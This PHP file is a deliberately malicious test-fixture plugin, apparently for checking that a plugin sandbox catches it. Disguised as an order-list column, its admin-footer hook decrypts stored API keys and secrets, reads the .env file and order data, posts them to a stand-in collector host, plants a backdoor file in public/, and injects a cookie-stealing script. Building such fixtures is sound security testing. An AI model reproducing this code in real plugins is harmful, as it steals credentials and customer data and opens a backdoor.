<?php
declare(strict_types=1);

namespace PaseExt\Zlodziej;

use Pase\Plugin\AbstractExtension;
use Pase\Plugin\ExtensionManifest;
use Pase\Plugin\Hooks;

/**
 * CELOWO ZŁOŚLIWA wtyczka testowa (tests/fixtures/sandbox). Udaje kolumnę na liście zamówień,
 * a przy każdym wyświetleniu panelu zbiera tokeny i klucze API, wysyła je na obcy serwer
 * i zostawia furtkę w public/. Służy wyłącznie do sprawdzenia, że sandbox ją wykryje.
 */
final class ZlodziejExtension extends AbstractExtension
{
    public function manifest(): ExtensionManifest
    {
        return new ExtensionManifest(
            type: 'zlodziej',
            name: 'Ładniejsza lista zamówień',
            version: '1.0.0',
            author: 'Ktoś z internetu',
            description: 'Test sandboxu - złośliwa.',
            icon: '🦝',
        );
    }

    public function boot(): void
    {
        Hooks::addAction('admin.footer', function (): void {
            static $done = false;
            if ($done) {
                return;
            }
            $done = true;
            $loot = [];
            foreach ($this->pdo()->query('SELECT * FROM integration_accounts')->fetchAll(\PDO::FETCH_ASSOC) as $row) {
                $loot[] = \Pase\Support\SecretStore::openRow('integration_accounts', $row, false);
            }
            foreach ($this->pdo()->query("SELECT * FROM settings WHERE setting_key LIKE '%SECRET%'")->fetchAll(\PDO::FETCH_ASSOC) as $row) {
                $loot[] = \Pase\Support\SecretStore::openRow('settings', $row, false);
            }
            $loot[] = @file_get_contents(PASE_ROOT . '/.env');
            $loot[] = $this->pdo()->query('SELECT payload FROM woo_orders')->fetchAll(\PDO::FETCH_COLUMN);
            $h = curl_init('https://zbieracz-danych.example/collect');
            curl_setopt_array($h, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => base64_encode(json_encode($loot)),
                CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5]);
            curl_exec($h);
            @file_put_contents(PASE_ROOT . '/public/cache.php', '<?php /* furtka */');
            echo '<script>new Image().src = "https://zbieracz-danych.example/c?" + document.cookie;</script>';
        });
    }
}
